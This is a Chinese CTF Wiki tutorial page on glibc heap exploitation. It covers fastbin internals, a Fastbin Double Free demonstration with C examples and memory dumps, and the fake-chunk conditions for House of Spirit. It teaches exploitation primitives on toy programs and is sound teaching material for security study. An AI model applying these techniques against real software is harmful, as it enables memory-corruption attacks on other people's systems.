


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" lang="zh_CN">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>Fastbin Attack &#8212; CTF Wiki </title>
    <link rel="stylesheet" href="../../_static/cloud.css" type="text/css" />
    <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
    <link rel="stylesheet" href="../../_static/css/custom.css" type="text/css" />
    <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Noticia+Text|Open+Sans|Droid+Sans+Mono" type="text/css" />
    <script type="text/javascript">
      var DOCUMENTATION_OPTIONS = {
        URL_ROOT:    '../../',
        VERSION:     '',
        COLLAPSE_INDEX: false,
        FILE_SUFFIX: '.html',
        HAS_SOURCE:  true,
        SOURCELINK_SUFFIX: '.txt'
      };
    </script>
    <script type="text/javascript" src="../../_static/jquery.js"></script>
    <script type="text/javascript" src="../../_static/underscore.js"></script>
    <script type="text/javascript" src="../../_static/doctools.js"></script>
    <script type="text/javascript" src="../../_static/translations.js"></script>
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    <script type="text/javascript" src="../../_static/jquery.cookie.js"></script>
    <script type="text/javascript" src="../../_static/cloud.base.js"></script>
    <script type="text/javascript" src="../../_static/cloud.js"></script>
    <link rel="shortcut icon" href="../../_static/favicon.ico"/>
    <link rel="search" title="搜索" href="../../search.html" />
    <link rel="next" title="Chunk Extend/Shrink" href="chunk_extend_shrink.html" />
    <link rel="prev" title="Use After Free" href="use_after_free.html" /> 
        <meta name="viewport" content="width=device-width, initial-scale=1">
  </head>
  <body>
    <div class="relbar-top">
        
    <div class="related" role="navigation" aria-label="related navigation">
      <h3>导航</h3>
      <ul>
        <li class="right" style="margin-right: 10px">
          <a href="../../index.html" title="內容目录"
             accesskey="C">toc</a></li>
        <li class="right" >
          <a href="chunk_extend_shrink.html" title="Chunk Extend/Shrink"
             accesskey="N">下一页</a> &nbsp; &nbsp;</li>
        <li class="right" >
          <a href="use_after_free.html" title="Use After Free"
             accesskey="P">上一页</a> &nbsp; &nbsp;</li>
    <li><a href="../../index.html">CTF Wiki </a> &#187;</li>

          <li class="nav-item nav-item-1"><a href="index.html" accesskey="U">堆利用</a> &#187;</li> 
      </ul>
    </div>
    </div>
  

    <div class="document">
      <div class="documentwrapper">
        <div class="bodywrapper">
          <div class="body" role="main">
            
  <div class="section" id="fastbin-attack">
<h1>Fastbin Attack<a class="headerlink" href="#fastbin-attack" title="永久链接至标题">¶</a></h1>
<div class="section" id="id1">
<h2>介绍<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h2>
<p>fastbin attack 是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。这类利用的前提是：</p>
<ul class="simple">
<li>存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞</li>
<li>漏洞发生于 fastbin 类型的 chunk 中</li>
</ul>
<p>如果细分的话，可以做如下的分类：</p>
<ul class="simple">
<li>Fastbin Double Free</li>
<li>House of Spirit</li>
<li>Alloc to Stack</li>
<li>Arbitrary Alloc</li>
</ul>
<p>其中，前两种主要漏洞侧重于利用 <code class="docutils literal"><span class="pre">free</span></code> 函数释放<strong>真的 chunk 或伪造的 chunk</strong>，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 <code class="docutils literal"><span class="pre">fd</span></code> 指针，直接利用 <code class="docutils literal"><span class="pre">malloc</span></code> 申请指定位置 chunk 进行攻击。</p>
</div>
<div class="section" id="id2">
<h2>原理<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h2>
<p>fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。 我们来看一下 fastbin 是怎样管理空闲 chunk
的。</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="nb">int</span> <span class="n">main</span><span class="p">(</span><span class="n">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">void</span> <span class="o">*</span><span class="n">chunk1</span><span class="p">,</span><span class="o">*</span><span class="n">chunk2</span><span class="p">,</span><span class="o">*</span><span class="n">chunk3</span><span class="p">;</span>
    <span class="n">chunk1</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">);</span>
    <span class="n">chunk2</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">);</span>
    <span class="n">chunk3</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">);</span>
    <span class="o">//</span><span class="n">进行释放</span>
    <span class="n">free</span><span class="p">(</span><span class="n">chunk1</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">chunk2</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">chunk3</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>释放前</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="mh">0x602000</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000041</span> <span class="o">&lt;===</span> <span class="n">chunk1</span>
<span class="mh">0x602010</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x602020</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x602030</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x602040</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000041</span> <span class="o">&lt;===</span> <span class="n">chunk2</span>
<span class="mh">0x602050</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x602060</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x602070</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x602080</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000041</span> <span class="o">&lt;===</span> <span class="n">chunk3</span>
<span class="mh">0x602090</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x6020a0</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x6020b0</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x6020c0</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000020f41</span> <span class="o">&lt;===</span> <span class="n">top</span> <span class="n">chunk</span>
</pre></div>
</div>
<p>执行三次 free 进行释放后</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="mh">0x602000</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000041</span> <span class="o">&lt;===</span> <span class="n">chunk1</span>
<span class="mh">0x602010</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x602020</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x602030</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x602040</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000041</span> <span class="o">&lt;===</span> <span class="n">chunk2</span>
<span class="mh">0x602050</span><span class="p">:</span>   <span class="mh">0x0000000000602000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x602060</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x602070</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x602080</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000041</span> <span class="o">&lt;===</span> <span class="n">chunk3</span>
<span class="mh">0x602090</span><span class="p">:</span>   <span class="mh">0x0000000000602040</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x6020a0</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x6020b0</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x6020c0</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000020f41</span> <span class="o">&lt;===</span> <span class="n">top</span> <span class="n">chunk</span>
</pre></div>
</div>
<p>此时位于 main_arena 中的 fastbin 链表中已经储存了指向 chunk3 的指针，并且 chunk 3、2、1构成了一个单链表</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Fastbins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x30</span><span class="p">,</span><span class="n">ptr</span><span class="o">=</span><span class="mh">0x602080</span><span class="p">]</span>
<span class="o">===&gt;</span><span class="n">Chunk</span><span class="p">(</span><span class="n">fd</span><span class="o">=</span><span class="mh">0x602040</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x40</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">)</span>
<span class="o">===&gt;</span><span class="n">Chunk</span><span class="p">(</span><span class="n">fd</span><span class="o">=</span><span class="mh">0x602000</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x40</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">)</span>
<span class="o">===&gt;</span><span class="n">Chunk</span><span class="p">(</span><span class="n">fd</span><span class="o">=</span><span class="mh">0x000000</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x40</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">)</span>
</pre></div>
</div>
<p>我们可以使用如下的图片来表示这一点 <img alt="image0" src="../../_images/fastbin_link_list.png" /></p>
</div>
<div class="section" id="fastbin-double-free">
<h2>Fastbin Double Free<a class="headerlink" href="#fastbin-double-free" title="永久链接至标题">¶</a></h2>
<div class="section" id="id3">
<h3>介绍<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h3>
<p>Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin
链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆(type confused)的效果。</p>
<p>Fastbin Double Free 能够成功利用主要有两部分的原因</p>
<ol class="arabic simple">
<li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</li>
<li>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</li>
</ol>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">/*</span> <span class="n">Another</span> <span class="n">simple</span> <span class="n">check</span><span class="p">:</span> <span class="n">make</span> <span class="n">sure</span> <span class="n">the</span> <span class="n">top</span> <span class="n">of</span> <span class="n">the</span> <span class="nb">bin</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">the</span>
       <span class="n">record</span> <span class="n">we</span> <span class="n">are</span> <span class="n">going</span> <span class="n">to</span> <span class="n">add</span> <span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">e</span><span class="o">.</span><span class="p">,</span> <span class="n">double</span> <span class="n">free</span><span class="p">)</span><span class="o">.</span>  <span class="o">*/</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">old</span> <span class="o">==</span> <span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
      <span class="p">{</span>
        <span class="n">errstr</span> <span class="o">=</span> <span class="s2">&quot;double free or corruption (fasttop)&quot;</span><span class="p">;</span>
        <span class="n">goto</span> <span class="n">errout</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
</div>
<div class="section" id="id4">
<h3>演示<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h3>
<p>下面的示例程序说明了这一点，当我们试图执行以下代码时</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="nb">int</span> <span class="n">main</span><span class="p">(</span><span class="n">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">void</span> <span class="o">*</span><span class="n">chunk1</span><span class="p">,</span><span class="o">*</span><span class="n">chunk2</span><span class="p">,</span><span class="o">*</span><span class="n">chunk3</span><span class="p">;</span>
    <span class="n">chunk1</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
    <span class="n">chunk2</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>

    <span class="n">free</span><span class="p">(</span><span class="n">chunk1</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">chunk1</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>如果你执行这个程序，不出意外的话会得到如下的结果，这正是 _int_free 函数检测到了 fastbin 的 double free。</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>*** Error in `./tst&#39;: double free or corruption (fasttop): 0x0000000002200010 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fbb7a36c7e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7fbb7a37537a]
/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fbb7a37953c]
./tst[0x4005a2]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fbb7a315830]
./tst[0x400499]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst
02200000-02221000 rw-p 00000000 00:00 0                                  [heap]
7fbb74000000-7fbb74021000 rw-p 00000000 00:00 0
7fbb74021000-7fbb78000000 ---p 00000000 00:00 0
7fbb7a0df000-7fbb7a0f5000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a0f5000-7fbb7a2f4000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a2f4000-7fbb7a2f5000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a2f5000-7fbb7a4b5000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a4b5000-7fbb7a6b5000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6b5000-7fbb7a6b9000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6b9000-7fbb7a6bb000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6bb000-7fbb7a6bf000 rw-p 00000000 00:00 0
7fbb7a6bf000-7fbb7a6e5000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8c7000-7fbb7a8ca000 rw-p 00000000 00:00 0
7fbb7a8e1000-7fbb7a8e4000 rw-p 00000000 00:00 0
7fbb7a8e4000-7fbb7a8e5000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8e5000-7fbb7a8e6000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8e6000-7fbb7a8e7000 rw-p 00000000 00:00 0
7ffcd2f93000-7ffcd2fb4000 rw-p 00000000 00:00 0                          [stack]
7ffcd2fc8000-7ffcd2fca000 r--p 00000000 00:00 0                          [vvar]
7ffcd2fca000-7ffcd2fcc000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
已放弃 (核心已转储)
</pre></div>
</div>
<p>如果我们在 chunk1 释放后，再释放 chunk2 ，这样 main_arena 就指向 chunk2 而不是 chunk1 了，此时我们再去释放 chunk1 就不再会被检测到。</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="nb">int</span> <span class="n">main</span><span class="p">(</span><span class="n">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">void</span> <span class="o">*</span><span class="n">chunk1</span><span class="p">,</span><span class="o">*</span><span class="n">chunk2</span><span class="p">,</span><span class="o">*</span><span class="n">chunk3</span><span class="p">;</span>
    <span class="n">chunk1</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
    <span class="n">chunk2</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>

    <span class="n">free</span><span class="p">(</span><span class="n">chunk1</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">chunk2</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">chunk1</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>第一次释放<code class="docutils literal"><span class="pre">free(chunk1)</span></code></p>
<p><img alt="image1" src="../../_images/fastbin_free_chunk1.png" /></p>
<p>第二次释放<code class="docutils literal"><span class="pre">free(chunk2)</span></code></p>
<p><img alt="image2" src="../../_images/fastbin_free_chunk2.png" /></p>
<p>第三次释放<code class="docutils literal"><span class="pre">free(chunk1)</span></code></p>
<p><img alt="image3" src="../../_images/fastbin_free_chunk3.png" /></p>
<p>注意因为 chunk1 被再次释放因此其 fd 值不再为 0 而是指向 chunk2，这时如果我们可以控制 chunk1 的内容，便可以写入其 fd 指针从而实现在我们想要的任意地址分配 fastbin 块。
下面这个示例演示了这一点，首先跟前面一样构造 main_arena=&gt;chunk1=&gt;chun2=&gt;chunk1的链表。之后第一次调用 malloc 返回 chunk1 之后修改 chunk1 的 fd 指针指向 bss 段上的 bss_chunk，之后我们可以看到 fastbin
会把堆块分配到这里。</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">typedef</span> <span class="n">struct</span> <span class="n">_chunk</span>
<span class="p">{</span>
    <span class="n">long</span> <span class="n">long</span> <span class="n">pre_size</span><span class="p">;</span>
    <span class="n">long</span> <span class="n">long</span> <span class="n">size</span><span class="p">;</span>
    <span class="n">long</span> <span class="n">long</span> <span class="n">fd</span><span class="p">;</span>
    <span class="n">long</span> <span class="n">long</span> <span class="n">bk</span><span class="p">;</span>
<span class="p">}</span> <span class="n">CHUNK</span><span class="p">,</span><span class="o">*</span><span class="n">PCHUNK</span><span class="p">;</span>

<span class="n">CHUNK</span> <span class="n">bss_chunk</span><span class="p">;</span>

<span class="nb">int</span> <span class="n">main</span><span class="p">(</span><span class="n">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">void</span> <span class="o">*</span><span class="n">chunk1</span><span class="p">,</span><span class="o">*</span><span class="n">chunk2</span><span class="p">,</span><span class="o">*</span><span class="n">chunk3</span><span class="p">;</span>
    <span class="n">void</span> <span class="o">*</span><span class="n">chunk_a</span><span class="p">,</span><span class="o">*</span><span class="n">chunk_b</span><span class="p">;</span>

    <span class="n">bss_chunk</span><span class="o">.</span><span class="n">size</span><span class="o">=</span><span class="mh">0x21</span><span class="p">;</span>
    <span class="n">chunk1</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
    <span class="n">chunk2</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>

    <span class="n">free</span><span class="p">(</span><span class="n">chunk1</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">chunk2</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">chunk1</span><span class="p">);</span>

    <span class="n">chunk_a</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
    <span class="o">*</span><span class="p">(</span><span class="n">long</span> <span class="n">long</span> <span class="o">*</span><span class="p">)</span><span class="n">chunk_a</span><span class="o">=&amp;</span><span class="n">bss_chunk</span><span class="p">;</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
    <span class="n">chunk_b</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;%p&quot;</span><span class="p">,</span><span class="n">chunk_b</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>在我的系统上 chunk_b 输出的值会是 0x601090，这个值位于bss段中正是我们之前设置的<code class="docutils literal"><span class="pre">CHUNK</span> <span class="pre">bss_chunk</span></code></p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Start</span>              <span class="n">End</span>                <span class="n">Offset</span>             <span class="n">Perm</span> <span class="n">Path</span>
<span class="mh">0x0000000000400000</span> <span class="mh">0x0000000000401000</span> <span class="mh">0x0000000000000000</span> <span class="n">r</span><span class="o">-</span><span class="n">x</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">Ox9A82</span><span class="o">/</span><span class="n">tst</span><span class="o">/</span><span class="n">tst</span>
<span class="mh">0x0000000000600000</span> <span class="mh">0x0000000000601000</span> <span class="mh">0x0000000000000000</span> <span class="n">r</span><span class="o">--</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">Ox9A82</span><span class="o">/</span><span class="n">tst</span><span class="o">/</span><span class="n">tst</span>
<span class="mh">0x0000000000601000</span> <span class="mh">0x0000000000602000</span> <span class="mh">0x0000000000001000</span> <span class="n">rw</span><span class="o">-</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">Ox9A82</span><span class="o">/</span><span class="n">tst</span><span class="o">/</span><span class="n">tst</span>
<span class="mh">0x0000000000602000</span> <span class="mh">0x0000000000623000</span> <span class="mh">0x0000000000000000</span> <span class="n">rw</span><span class="o">-</span> <span class="p">[</span><span class="n">heap</span><span class="p">]</span>

<span class="mh">0x601080</span> <span class="o">&lt;</span><span class="n">bss_chunk</span><span class="o">&gt;</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000021</span>
<span class="mh">0x601090</span> <span class="o">&lt;</span><span class="n">bss_chunk</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span><span class="p">:</span><span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x6010a0</span><span class="p">:</span>               <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x6010b0</span><span class="p">:</span>               <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x6010c0</span><span class="p">:</span>               <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
</pre></div>
</div>
<p>值得注意的是，我们在 main 函数的第一步就进行了<code class="docutils literal"><span class="pre">bss_chunk.size=0x21;</span></code>的操作，这是因为_int_malloc会对欲分配位置的 size 域进行验证，如果其 size 与当前 fastbin 链表应有 size 不符就会抛出异常。</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>*** Error in `./tst&#39;: malloc(): memory corruption (fast): 0x0000000000601090 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f8f9deb27e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x82651)[0x7f8f9debd651]
/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f8f9debf184]
./tst[0x400636]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f8f9de5b830]
./tst[0x4004e9]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst
00bc4000-00be5000 rw-p 00000000 00:00 0                                  [heap]
7f8f98000000-7f8f98021000 rw-p 00000000 00:00 0
7f8f98021000-7f8f9c000000 ---p 00000000 00:00 0
7f8f9dc25000-7f8f9dc3b000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9dc3b000-7f8f9de3a000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9de3a000-7f8f9de3b000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9de3b000-7f8f9dffb000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9dffb000-7f8f9e1fb000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e1fb000-7f8f9e1ff000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e1ff000-7f8f9e201000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e201000-7f8f9e205000 rw-p 00000000 00:00 0
7f8f9e205000-7f8f9e22b000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e40d000-7f8f9e410000 rw-p 00000000 00:00 0
7f8f9e427000-7f8f9e42a000 rw-p 00000000 00:00 0
7f8f9e42a000-7f8f9e42b000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e42b000-7f8f9e42c000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e42c000-7f8f9e42d000 rw-p 00000000 00:00 0
7fff71a94000-7fff71ab5000 rw-p 00000000 00:00 0                          [stack]
7fff71bd9000-7fff71bdb000 r--p 00000000 00:00 0                          [vvar]
7fff71bdb000-7fff71bdd000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
已放弃 (核心已转储)
</pre></div>
</div>
<p>_int_malloc 中的校验如下</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">fastbin_index</span> <span class="p">(</span><span class="n">chunksize</span> <span class="p">(</span><span class="n">victim</span><span class="p">))</span> <span class="o">!=</span> <span class="n">idx</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
    <span class="p">{</span>
      <span class="n">errstr</span> <span class="o">=</span> <span class="s2">&quot;malloc(): memory corruption (fast)&quot;</span><span class="p">;</span>
    <span class="n">errout</span><span class="p">:</span>
      <span class="n">malloc_printerr</span> <span class="p">(</span><span class="n">check_action</span><span class="p">,</span> <span class="n">errstr</span><span class="p">,</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">));</span>
      <span class="k">return</span> <span class="n">NULL</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
</div>
<div class="section" id="id5">
<h3>小总结<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h3>
<p>通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果(
首先要通过验证 )，这就相当于任意地址写任意值的效果。</p>
</div>
</div>
<div class="section" id="house-of-spirit">
<h2>House Of Spirit<a class="headerlink" href="#house-of-spirit" title="永久链接至标题">¶</a></h2>
<div class="section" id="id6">
<h3>介绍<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h3>
<p>House of Spirit 是 <code class="docutils literal"><span class="pre">the</span> <span class="pre">Malloc</span> <span class="pre">Maleficarum</span></code> 中的一种技术。</p>
<p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p>
<p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p>
<ul class="simple">
<li>fake chunk 的 ISMMAP 位不能为1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li>
<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li>
<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li>
<li>fake chunk 的 next chunk 的大小不能小于 <code class="docutils literal"><span class="pre">2</span> <span class="pre">*</span> <span class="pre">SIZE_SZ</span></code>，同时也不能大于<code class="docutils literal"><span class="pre">av-&gt;system_mem</span></code> 。</li>
<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li>
</ul>
